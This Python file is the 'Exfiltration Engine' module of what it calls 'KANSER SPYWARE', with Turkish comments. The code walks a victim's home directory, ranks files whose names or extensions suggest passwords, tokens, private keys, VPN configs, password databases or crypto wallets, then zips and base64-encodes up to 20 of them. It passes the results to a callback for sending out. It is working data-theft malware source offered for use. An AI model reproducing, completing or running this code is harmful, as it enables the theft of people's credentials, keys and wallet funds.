#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER SPYWARE — Exfiltration Engine
Veri disari cikarma + Hedefli dosya taramasi
"""
import os, sys, json, base64, zipfile, io, threading, time, shutil, tempfile
from datetime import datetime

class Exfil:
    def collect_and_send(self, send_callback, target_dir=None):
        """Hedefli dosya taramasi + toplu gonderim"""
        results = self._scan_valuable_files(target_dir)
        send_callback({"type": "exfil_report", "data": json.dumps(results)})

    def _scan_valuable_files(self, base_dir=None):
        if not base_dir:
            base_dir = os.path.expanduser("~")

        keywords = ["password", "secret", "token", "api", "key", "wallet", "private", "credential", "config", ".env", "backup", "dump", "database", "wallet.dat"]
        extensions = [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".csv", ".pem", ".key", ".pfx", ".p12", ".ovpn", ".rdp", ".sql", ".db", ".kdbx", ".json", ".xml", ".config", ".env", ".yml", ".yaml"]

        found = []
        try:
            for root, dirs, files in os.walk(base_dir):
                dirs[:] = [d for d in dirs if not d.startswith(".") and d not in ["node_modules", "__pycache__", ".git"]]
                for f in files:
                    try:
                        fp = os.path.join(root, f)
                        size = os.path.getsize(fp)
                        if size > 10 * 1024 * 1024 or size < 5: continue

                        name_lower = f.lower()
                        score = 0
                        if any(kw in name_lower for kw in keywords): score += 5
                        if any(name_lower.endswith(ext) for ext in extensions): score += 2
                        if size < 1024 * 100: score += 1

                        if score >= 2:
                            found.append({"path": fp, "name": f, "size": size, "score": score, "modified": datetime.fromtimestamp(os.path.getmtime(fp)).isoformat()})
                    except: pass
        except: pass

        found.sort(key=lambda x: x["score"], reverse=True)
        return found[:50]

    def zip_and_send(self, send_callback, paths):
        """Seilmis dosyalari ZIP yapip gonder"""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for p in paths[:20]:
                try:
                    if os.path.exists(p) and os.path.getsize(p) < 5 * 1024 * 1024:
                        zf.write(p, os.path.basename(p))
                except: pass
        data = base64.b64encode(buf.getvalue()).decode()
        send_callback({"type": "exfil_zip", "data": data, "files": len(paths)})

    def upload_file(self, send_callback, filepath):
        """Tek dosya yukle"""
        try:
            with open(filepath, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            send_callback({"type": "exfil_file", "data": data, "name": os.path.basename(filepath)})
        except: pass

if __name__ == "__main__":
    e = Exfil()
    results = e._scan_valuable_files()
    for r in results[:10]:
        print(f"[{r['score']}] {r['path']} ({r['size']}b)")
